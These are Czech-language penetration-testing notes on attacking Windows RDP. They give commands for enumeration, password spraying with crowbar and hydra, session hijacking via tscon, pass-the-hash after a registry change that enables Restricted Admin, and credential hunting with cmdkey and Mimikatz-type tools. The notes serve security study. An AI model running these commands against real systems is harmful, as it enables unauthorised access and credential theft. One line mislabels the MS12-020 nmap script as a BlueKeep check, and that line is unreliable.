# 🖥️ RDP (3389) – Remote Desktop Protocol

RDP je Microsoft protokol pro vzdálený grafický přístup k Windows. Získání RDP přístupu znamená interaktivní GUI session, což usnadňuje další enumeraci, práci se soubory a pohyb v síti.

---

# 🔍 1. Enumerace RDP

První krok:

```
nmap -sC -sV -p 3389 <IP>
```

Hledám:

- verzi RDP
- NLA (Network Level Authentication)
- název systému
- doménu

---

## Nmap skripty

Kontrola bezpečnostních nastavení:

```
nmap --script rdp-enum-encryption -p 3389 <IP>
```

Kontrola BlueKeep zranitelnosti:

```
nmap --script rdp-vuln-ms12-020 -p 3389 <IP>
```

---

# 🔑 2. Password Spraying

Klasický brute-force je často špatná volba kvůli:

- Account Lockout Policy
- detekci IDS/EDR
- blokaci účtů

Lepší je zkoušet jedno heslo proti více uživatelům.

---

## Crowbar

```
crowbar -b rdp \
-s <IP>/32 \
-U users.txt \
-c 'Password123!'
```

---

## Hydra

Jeden uživatel:

```
hydra -l administrator \
-p Password123 \
rdp://<IP>
```

Více uživatelů:

```
hydra -L users.txt \
-p Password123 \
rdp://<IP>
```

---

# 🖥️ 3. Připojení přes RDP

## xfreerdp

Normální přihlášení:

```
xfreerdp /v:<IP> /u:user /p:password
```

---

Přes doménu:

```
xfreerdp /v:<IP> \
/u:DOMAIN\\user \
/p:password
```

---

Dynamické rozlišení:

```
xfreerdp /v:<IP> \
/u:user \
/p:password \
/dynamic-resolution
```

# 🎭 4. RDP Session Hijacking

Pokud mám administrátorská práva na stroji a jiný uživatel je přihlášen přes RDP, mohu převzít jeho session.

Cíl:

- administrátor
- doménový administrátor
- servisní účet

---

## Zjištění aktivních session

```
query user
```

Příklad:

```
USERNAME    SESSIONNAME   ID
admin       rdp-tcp#1     2
user        rdp-tcp#3     3
```

---

## Převzetí session

Vyžaduje SYSTEM práva.

```
tscon <ID> /dest:<SESSION>
```

Například:

```
tscon 2 /dest:rdp-tcp#3
```

Výsledek:

- moje session se přepne do uživatelovy plochy
- nepotřebuji jeho heslo

---

# 🔐 5. RDP Pass-the-Hash

Pokud mám pouze NTLM hash, nemusím znát heslo.

Požadavek:

- NTLM hash
- povolený Restricted Admin Mode

---

## Povolení Restricted Admin

Pokud mám admin přístup:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa ^
/v DisableRestrictedAdmin ^
/t REG_DWORD ^
/d 0 ^
/f
```

---

## Přihlášení přes hash

```
xfreerdp \
/v:<IP> \
/u:user \
/pth:<NTLM_HASH>
```

---

# 🧠 6. RDP Credential Hunting

RDP uživatelé mohou zanechat:

- uložené credentials
- cache
- aktivní session tokeny

---

## Uložené RDP přihlašovací údaje

Windows:

```
cmdkey /list
```

Hledám:

```
Target:
TERMSRV/server
```

---

## LSASS

Aktivní RDP uživatelé mohou mít informace v LSASS:

Nástroje:

- Mimikatz
- Pypykatz
- LaZagne

---

# ⚠️ 7. Známé RDP útoky

## BlueKeep (CVE-2019-0708)

Kritická chyba v RDP službě.

Postiženy:

- Windows 7
- Windows Server 2008

Dnes většinou opraveno.
